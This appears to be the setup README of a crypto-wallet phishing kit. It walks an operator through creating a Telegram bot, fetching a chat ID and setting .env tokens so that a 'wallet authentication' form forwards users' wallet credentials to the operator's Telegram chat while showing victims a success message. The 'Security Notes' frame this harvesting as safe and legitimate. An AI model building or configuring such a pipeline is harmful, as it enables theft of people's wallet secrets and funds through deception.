# Telegram Bot Setup Guide

This guide will help you set up a Telegram bot to handle wallet authentication requests.

## Step 1: Create a Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Start a chat with BotFather
3. Send `/newbot` command
4. Follow the instructions to create your bot
5. Save the bot token (you'll need this later)

## Step 2: Get Your Chat ID

1. Start a chat with your newly created bot
2. Send any message to the bot
3. Visit this URL in your browser (replace YOUR_BOT_TOKEN with your actual token):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
4. Look for the "chat" object and copy the "id" value (this is your chat ID)

## Step 3: Configure Environment Variables

Create or update your `.env` file in the project root:

```env
# Telegram Bot Configuration
VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

## Step 4: Test the Integration

1. Start your development server
2. Go to the wallet authentication page
3. Select a wallet and enter your credentials
4. Submit the form
5. Check your Telegram chat - you should receive a formatted message with the wallet data

## How It Works

When a user submits wallet credentials:

1. The form validates the input
2. Data is sent to your Telegram bot via the Telegram API
3. You receive a formatted message with all the wallet details
4. The user gets a success message

## Security Notes

- The bot token and chat ID are stored in environment variables
- All communication is done through Telegram's secure API
- No sensitive data is stored locally
- You can approve/reject requests by replying to the bot messages

## Troubleshooting

### Bot not responding
- Check that your bot token is correct
- Ensure the bot is not blocked
- Verify the chat ID is correct

### Environment variables not working
- Make sure the `.env` file is in the project root
- Restart your development server after adding environment variables
- Check that variable names start with `VITE_`

### API errors
- Check the browser console for error messages
- Verify your bot token has the necessary permissions
- Ensure your chat ID is a valid number
